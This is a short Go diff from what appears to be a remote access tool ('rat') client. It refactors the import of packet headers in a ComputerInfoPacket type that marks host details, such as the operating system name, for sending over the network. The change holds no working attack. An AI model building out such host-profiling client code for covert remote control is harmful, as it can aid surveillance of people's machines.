@@ -3,7 +3,7 @@ package main
 import (
 	"oslib"
 	"rat/client/computer"
-	"rat/shared"
+	"rat/shared/network/header"
 )
 
 type ComputerInfoPacket struct {
@@ -13,8 +13,8 @@ type ComputerInfoPacket struct {
 	OperatingSystemDisplayName string `network:"send"`
 }
 
-func (packet ComputerInfoPacket) Header() shared.PacketHeader {
-	return shared.ComputerInfoHeader
+func (packet ComputerInfoPacket) Header() header.PacketHeader {
+	return header.ComputerInfoHeader
 }
 
 func (packet *ComputerInfoPacket) Init() {
